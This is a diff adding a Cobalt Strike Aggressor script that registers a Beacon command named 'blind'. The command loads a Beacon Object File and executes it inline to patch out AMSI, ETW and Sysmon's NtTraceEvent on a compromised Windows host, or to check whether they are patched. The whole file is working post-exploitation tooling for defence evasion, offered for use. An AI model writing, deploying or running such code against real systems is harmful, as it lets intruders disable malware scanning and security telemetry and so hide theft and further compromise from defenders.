@@ -1,0 +1,51 @@
+beacon_command_register(
+    "blind",
+    "Patch, revert, or check AMSI, ETW, and NtTraceEvent (Sysmon)",
+    "Usage:\n" .
+    "\tblind patch       - Patch AMSI, ETW, and Sysmon (All)\n" .
+    "\tblind amsi        - Patch AMSI only\n" .
+    "\tblind etw         - Patch ETW only\n" .
+    "\tblind sysmon      - Patch NtTraceEvent only\n" .
+    "\tblind check       - Check AMSI, ETW, and NtTraceEvent status\n"
+);
+
+alias blind {
+    if (size(@_) != 2) {
+        berror($1, "Incorrect usage.");
+        berror($1, beacon_command_detail("blind"));
+        return;
+    }
+
+    local('$handle $data $args $mode');
+
+    if ($2 eq "patch") {
+        $mode = 0;
+    } else if ($2 eq "amsi") {
+        $mode = 1;
+    } else if ($2 eq "etw") {
+        $mode = 2;
+    } else if ($2 eq "sysmon") {
+        $mode = 3;
+    } else if ($2 eq "check") {
+        $mode = 4;
+    } else {
+        berror($1, "Unknown command: $2");
+        berror($1, beacon_command_detail("blind"));
+        return;
+    }
+
+    $args = bof_pack($1, "i", $mode);
+
+    # Load .o from absolute path
+    $handle = openf("dist/bofblind.x64.o");
+    if ($handle == -1) {
+        berror($1, "Failed to open BOF object: dist/bofblind.x64.o");
+        return;
+    }
+
+    $data = readb($handle, -1);
+    closef($handle);
+
+    btask($1, "Blinder: blind $2");
+    beacon_inline_execute($1, $data, "go", $args);
+}
